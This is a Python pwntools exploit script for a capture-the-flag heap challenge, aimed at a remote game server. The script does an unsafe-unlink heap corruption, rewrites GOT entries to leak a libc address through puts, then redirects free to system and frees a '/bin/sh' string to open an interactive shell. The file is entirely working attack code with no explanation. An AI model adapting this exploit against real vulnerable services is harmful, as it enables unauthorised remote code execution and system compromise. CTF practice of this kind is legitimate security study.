#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
libc = elf.libc

#  io = process("./pwn")
io = remote("8sdafgh.gamectf.com", 35555)

def DEBUG():
    info("calloc small @ {:#x}".format(0x400B46))
    info("calloc large @ {:#x}".format(0x400B84))
    info("free small @ {:#x}".format(0x400C35))
    info("free large @ {:#x}".format(0x400C5A))
    info("edit small @ {:#x}".format(0x400CF5))
    info("edit large @ {:#x}".format(0x400D29))
    pause()
    
def add(kind, cont):
    io.sendlineafter("Exit\n", "1")
    io.sendlineafter("Large\n", str(kind))
    io.sendafter("Content:\n", cont)
    sleep(0.01)

def delete(kind):
    io.sendlineafter("Exit\n", "2")
    io.sendlineafter("Large\n", str(kind))

def edit(kind, cont):
    io.sendlineafter("Exit\n", "3")
    io.sendlineafter("Large\n", str(kind))
    io.sendafter("Content:\n", cont)
    sleep(0.01)

add(2, '0' * 0x208)
add(1, '1' * 0x28)
add(1, '2' * 0x28)
delete(2)

add(1, '3' * 0x28)
add(1, '4' * 0x28)

ptr = 0x6020D8
edit(2, flat(0, 0x21, ptr - 0x18, ptr - 0x10, 0x20, 0x210, '\n'))
delete(1)

edit(2, flat('\0' * 0x10, elf.got['puts'], elf.got['free'], '\n'))
edit(2, flat(elf.sym['puts'], '\n'))

delete(1)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['puts']
success("libc @ {:#x}".format(libc.address))

edit(2, flat(libc.sym['system'], '\n'))

add(1, "/bin/sh\0\n")
delete(1)

io.interactive()
